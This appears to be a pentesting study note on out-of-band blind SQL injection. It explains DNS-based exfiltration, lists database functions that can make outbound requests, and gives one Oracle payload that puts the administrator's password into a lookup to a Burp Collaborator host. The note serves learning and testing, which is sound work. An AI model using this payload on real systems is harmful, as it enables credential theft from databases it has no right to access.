# OUT-OF-BAND

## <mark style="color:$primary;">ABOUT</mark>

An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the in-band techniques described so far will work. The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering <mark style="color:purple;">**out-of-band network interactions**</mark> to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.

A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems.

## <mark style="color:$primary;">WHERE TO LOOK</mark>

Same places time-based blind works: parameters that clearly affect database logic but produce identical 200s with fixed content length. Login endpoints, tracking cookies, profile UUIDs, search facets, webhook configs, feature toggles. Bonus points when the backend runs on Windows (xp\_dirtree, xp\_fileexist love UNC paths), Oracle (UTL\_HTTP, UTL\_INADDR), or old MySQL/MariaDB with permissive secure\_file\_priv. DNS is king because almost every corporate firewall allows UDP/53 outbound while blocking everything else. HTTP exfil only viable when outbound 80/443 is unrestricted and the DB engine has a native way to make requests (Oracle UTL\_HTTP.request, SQL Server OPENROWSET+BULK).&#x20;

The easiest and most reliable tool for using out-of-band techniques is Burp Collaborator. This is a server that provides custom implementations of various network services, including DNS. It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Burp Suite Professional includes a built-in client that's configured to work with Burp Collaborator right out of the box. For more information, see the documentation for Burp Collaborator.

## <mark style="color:$primary;">EXAMPLES</mark>

<details>

<summary>XML Combined with OOB</summary>

```sql
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.a4fspnskcigrg99kt20vx7sdu40voncc.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

Here we are triggering DNS Lookup (Catching it with Burp Collaborator) by putting a XML entity into SQL request where are are injecting another SQL request into subdomain\
![](<../../../.gitbook/assets/image (3) (1).png>)

</details>
